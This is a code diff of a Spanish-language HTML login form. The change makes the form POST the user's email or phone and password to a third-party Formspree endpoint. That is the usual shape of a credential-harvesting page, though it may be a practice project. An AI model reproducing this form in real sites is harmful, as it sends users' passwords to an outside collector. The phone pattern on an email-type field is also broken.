@@ -16,16 +16,16 @@
       <div class="title-styles">
         <h3>Inicia Sesión</h3>
       </div>
-      <form class="form-styles">
+      <form class="form-styles" action="https://formspree.io/f/xpzelwgj" method="POST">
         <div class="form-sections-styles">
           <div>
-            <label for="">Ingresa tu Correo</label>
-            <input type="email" required placeholder="Tu Correo...">
+            <label for="">Ingresa tu Correo o Número Teléfonico</label>
+            <input type="email" id="contacto" placeholder="Tu Correo..." pattern="[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}|(\d{3})\s*(\d{3})\s*(\d{4})" required>
           </div>
     
           <div>
             <label for="">Ingresa tu Contraseña</label>
-            <input type="password" required placeholder="Tu Contraseña...">
+            <input type="password" id="password" placeholder="Tu Contraseña..." required>
           </div>
         </div>
   
